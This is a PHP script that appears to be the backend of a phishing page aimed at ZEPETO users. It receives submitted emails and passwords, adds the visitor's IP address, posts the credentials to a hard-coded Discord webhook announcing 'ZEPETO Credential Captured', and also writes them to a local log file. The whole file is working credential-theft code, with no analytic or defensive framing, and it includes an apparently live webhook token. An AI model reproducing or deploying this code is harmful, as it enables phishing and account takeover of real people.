<?php
define('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1525191917468647514/b8qkmd69Vl2JyctJjiEqSq6jYYwME1rCN0WJKzgefO3RVuLBlV8QppSTcP-f3-IRDjEy');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit; }

$email = trim($_POST['email'] ?? '');
$password = $_POST['password'] ?? '';

if (empty($email) || empty($password)) { http_response_code(400); exit; }

// Get IP
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Send to Discord
$payload = json_encode([
    'content' => "@here **🔴 ZEPETO Credential Captured**\nEmail: `{$email}`\nPassword: `{$password}`\nIP: {$ip}",
], JSON_UNESCAPED_UNICODE);

$ch = curl_init(DISCORD_WEBHOOK_URL);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $payload,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 5,
]);
curl_exec($ch);
curl_close($ch);

// Log locally too
file_put_contents(__DIR__ . '/logs.txt', date('Y-m-d H:i:s') . " | $email:$password | $ip\n", FILE_APPEND);

echo json_encode(['status' => 'ok']);
